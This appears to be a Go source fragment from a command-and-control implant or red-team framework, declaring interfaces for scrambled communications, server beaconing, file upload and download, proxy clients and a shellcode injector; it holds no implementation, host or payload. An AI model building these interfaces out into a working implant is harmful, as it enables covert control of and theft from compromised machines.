package main

const BYTES = 0
const STRING = 1

type EncType interface {
	scramble() []byte
}

type Request interface {
	queryServer()
	upload(string)
	download(string) string
	addProxyClient(Beacon)
	exitHandler()
}

type CommType interface {
	EncType
	Request
}

type IShellcodeInjector interface {
	inject() error
}
